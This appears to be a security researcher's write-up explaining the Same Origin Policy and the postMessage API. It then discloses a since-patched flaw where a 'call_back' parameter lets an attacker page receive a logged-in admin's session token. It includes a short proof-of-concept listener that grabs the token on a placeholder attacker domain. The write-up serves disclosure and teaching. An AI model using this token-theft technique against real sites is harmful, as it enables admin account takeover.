# How We Got Admin Tokens via Insecure PostMessage

We’ve all heard it before — *“client-side validation and authentication don’t count.”* If you want real security, it has to be on the server.

That’s true in many cases (emphasis on many), but not always. As I’ll show later, some types of validation actually depend entirely on the client.

Here’s a quick breakdown of what I mean by client in the context of a web application:

![Diagram](https://raw.githubusercontent.com/proflamyt/300days-of-hacking/refs/heads/main/Topic64/WriteUp/ola.svg)


What we referrred to as the **server-side** (or backend) is usually a black box — it handles logic, data processing, and serving responses for the web app.

Also, what can be considered as **client-side** in our scenario refers to the code that runs in the browser — typically HTML, CSS, and JavaScript — responsible for rendering, interaction, and the user interface. That’s the part users directly interact with.

It’s worth noting that architecture can vary. In some setups, a proxy may be in a position to be referred to  as the client depending on the situation. But in our case, when we say client, we’re strictly talking about the code running inside the browser.


## Client-Side Validation (Why It Matters)

Let’s start with one of the basics of browser security — the **Same Origin Policy (SOP)**. One of the browser’s main jobs is to protect *you*, the user, and your system from the wild west of the internet.  

Without those protections, imagine visiting some random site like `example.com` and it could just read files from your computer or peek into other tabs you have open. Maybe one of those tabs has a private chat or sensitive info. That would be a total nightmare, right?  

That’s exactly why SOP exists. It’s basically a rule that says: a website can’t freely interact with another website that has a *different origin*.  

In this context, **“origin”** is very specific — it includes the **protocol**, **host**, and **port**. So, if any of those don’t match, they’re considered different origins. This is why your Facebook tab has no idea what you’re reading or typing on X (Twitter), even though both are open in the same browser.  

And here’s where it really makes sense: your browser can technically open local files using something like the `file://` protocol (for example, `file:///etc/hosts`). But when you visit a site like `https://evil[.]com`, it can’t reach into your local files — even if both are open at the same time.  

That’s the Same Origin Policy doing its job. It keeps websites in their own little sandbox and stops them from crossing into places they shouldn’t — like your system files or other sites you’re logged into.


For example, Chrome enforces this by running each website inside a tightly controlled **sandbox** and runs each tab as a separate **subprocess**. This sandbox stops the page from directly touching your files or any sensitive system resources. Whenever a page needs to access something local — like a file or the network — it has to go through Chrome’s trusted **browser kernel process** using **Inter-Process Communication (IPC)**. In short, even if a site tries to break out, it’s stuck talking through Chrome’s security gate.

<img width="1166" height="542" alt="image" src="https://github.com/user-attachments/assets/4215f715-ec6f-4760-9de8-2f3073b981ae" />



## Communicating Across Origins and Domains

The Same Origin Policy is pretty awesome as it’s one of the main things keeping attackers from messing with our data or stealing info between sites. But there’s a catch: while SOP keeps us safe, it also makes it harder for different sites to talk to each other when they actually *need* to.

Pretty soon, web developers and users realized that for the internet to feel seamless, websites sometimes need a way to share resources or send messages across domains. A common example is **signing in across different sites** — say you’re logged into Website A, and Website B needs to confirm that without asking you to log in again.

To make that possible (and still keep things secure), browsers introduced controlled ways for cross-domain communication, mainly through:

- **CORS (Cross-Origin Resource Sharing)**
- **PostMessage API**

In this writeup, we’ll be focusing on the **PostMessage** part and how it was used insecurely.


### Posting Messages

The **PostMessage** API works kind of like a broadcast system. One origin can “shout” a message to another origin — or even to *anyone* who’s listening. On the other end, an origin can choose to listen for incoming messages from *anyone* or a specific *person* or send out its own broadcasts. It’s basically an open communication channel within the browser world.

But here’s the catch — shouting to *everyone* isn’t always a great idea. In practice, a site should only send messages to a **specific, trusted origin**. The same goes for receiving messages: blindly accepting data from any random source is risky, especially if you’re going to use that data in your page(DOM) or UI (innerHTML). That’s how things can get messy (and sometimes, exploitable).

### Origin A sending a message to Origin B

The model for sending and receiving messages with `postMessage` is pretty simple:  
- **Origin A** sends a message using the `window.postMessage()` API.  
- **Origin B** listens for it with the `window.onmessage` event handler.  

When the message is received, the `onmessage` callback gets an **event object** that includes:  
- `data` → the actual content being sent, and  
- `origin` → the domain of whoever sent the message.
- `source` ->  message emitter
- `port` ->  objects  associated with the channel the message is being sent through
- `lasteventid` -> unique ID for the event.

  https://developer.mozilla.org/en-US/docs/Web/API/Worker/message_event

Here’s a simple example:

```js
// ---- Origin A (sender) ----
const popup = window.open("https://example-b.com", "_blank");

// Send a message to Origin B
popup.postMessage({ action: "getAdminToken" }, "https://example-b.com");
```

```js
// ---- Origin B (receiver) ----
window.addEventListener("message", (event) => {
  // checking who sent the message
  if (event.origin !== "https://example-a.com") return;

  console.log("Message received:", event.data);
  // respond if needed
  event.source.postMessage({ token: "admin-123" }, event.origin);
});
```

### Vulnerability Discovered

A coworker spotted a weird feature in a common web app: when you click **“Login as Admin”**, a popup briefly appears shows authentication failed and sends the user that wants to authenticate as the admin to a login page that asks for a username and password. We wondered — how was the site trying to authenticate in the first place?

Digging through the frontend code, we found the code that opens the popup and discovered it waits for a postmessage `message` event. Once it receives a message, the code checks that `event.origin` matches the origin it opened (good — that prevents blindly accepting any postMessage broadcast). If the origin matches, it takes the `data` from the message and uses that data to set the user session.


<img width="1320" height="169" alt="image" src="https://github.com/user-attachments/assets/0400040f-27ee-4bb2-a4ce-520022b4914a" />


So — is this exploitable?

First, we checked whether we controlled the validation URL. If we did, that would’ve been ideal — we could send a cross-origin message that the site would accept. We decided not to pursue that path because we couldn’t find a way to bypass the validation. Even if there wasn’t a strict check, we’d also need to find a **sink** — somewhere the app actually *uses* the data insecurely. Without a vulnerable sink, the best we could do was force the user to use our session if there were self xss and we couldn’t make the site accept arbitrary validation responses from us.

We dug into the second origin — the one the popup was supposed to talk to — and found that the popup loads a page on a subdomain which immediately runs a small script that posts a token and username back to the opener.


    /get-active-user-session?call_back=https://example.com

    
```html
<script>
  window.opener.postMessage(
    { user: "admin", token: "abc123" },
    "https://example.com" 
  );
  window.close();
</script>
```

This second subdomain uses cookie-based authentication, so if a user is already logged in, the popup just loads their info ( embeds their username and token in the js ) using their existing session cookie, and sends it straight back to the main site.  

Basically, if an admin is already logged in on that subdomain, the main site can grab the token it sends and treat the admin as logged in there too. No extra login needed, smooth and clever right !.

There’s a big problem however, the JavaScript reads the post target directly from the page URL — literally from a `call_back` query parameter. That means if we change that `call_back` value to any URL we want, the script will send the `postMessage` payload to that arbitrary URL.

### Our Attack (POC)

We picked an attack path that’s annoyingly simple in practice. The idea: get a victim who’s already logged in as an **admin** on Website A (so they have a valid admin cookie), then get them to open an attacker-controlled page that listens for `postMessage` from Website A. Because the vulnerable site reads its post target from a `call_back` query parameter, we can point it at our listener.  

So the flow looked like this:

1. Lure an admin (already logged into Website A) to the vulnerable page URL we control — the URL includes a `call_back` parameter that points to our domain.  
2. The vulnerable site runs its JavaScript and sends a `postMessage` to the `call_back` URL from the admin’s browser (authenticated context).  
3. Our attacker page (on the `call_back` domain) receives the message and can grab whatever the site sent — in our case, admin tokens — because the message was sent from the admin’s logged-in browser session


POC
```js
    window.open("https://<vulnerable_site.com>/get-active-user-session?call_back=<https://ourattackercontrolleddomain.com>");
    window.addEventListener("message", function(e) {
      if (e.origin == <vulnerable_site.com>) {
        	alert(e.data.user);
          alert( e.data.token);
      }
```

In short: trick the admin’s browser into sending sensitive data to our listener by abusing the `call_back` query parameter, defeating SOP.




Ps: We disclosed this to our affected clients, the vendor was contacted and a patch was issued. The fix you may ask?
<img width="1000" height="162" alt="image" src="https://github.com/user-attachments/assets/0bc68afe-1ce3-435e-80d3-91e3605f76ff" />





